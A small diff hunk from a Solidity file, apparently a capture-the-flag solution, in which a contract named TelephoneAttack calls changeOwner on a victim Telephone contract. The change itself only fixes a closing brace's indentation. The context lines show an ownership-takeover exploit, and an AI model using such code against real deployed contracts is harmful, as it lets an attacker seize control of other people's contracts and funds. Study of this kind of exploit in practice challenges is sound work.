@@ -22,4 +22,4 @@ contract TelephoneAttack{
          tel = Telephone(_victim);
          tel.changeOwner(msg.sender);
     }
-   }
+}
